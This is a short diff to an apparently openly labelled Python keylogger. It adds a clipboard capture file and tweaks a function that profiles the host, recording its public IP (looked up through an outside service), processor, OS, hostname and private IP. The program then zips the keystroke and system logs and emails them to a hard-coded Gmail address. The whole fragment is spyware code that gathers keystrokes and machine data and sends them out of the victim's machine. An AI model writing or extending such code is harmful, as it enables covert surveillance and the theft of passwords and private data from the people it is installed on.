@@ -31,6 +31,7 @@ from requests import get
 
 log_file = r"\keylog.txt"
 system_file = r"\systeminfo.txt"
+clipboard_file = r"\clipboard.txt"
 file_path = r"Z:\keylogger\email"
 
 email_address = "keyloggerproject4@gmail.com"
@@ -95,23 +96,22 @@ def computer_information():
         IPAddr = socket.gethostbyname(hostname)
         try:
             public_ip = get("https://api.ipify.org").text
-            f.write("Public IP Address: " + public_ip)
+            f.write("Public IP Address: \n" + public_ip)
 
         except Exception:
             f.write("Could not get Public IP Address.")
 
         f.write("Processor" + (platform.processor()) + '\n')
-        f.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("System: " + platform.system() + "  " + platform.version() + '\n')
         f.write("Machine: " + platform.machine() + "\n")
         f.write("Hostname:" + hostname + "\n")
         f.write("Private IP Address: " + IPAddr + "\n")
 
 
 computer_information()
-
 zip_folder(email_folder + log_file,email_folder + system_file)
-
 send_email(log_file, email_folder_zip, to_address)
+
 
 #pypnut logger methods
 count = 0
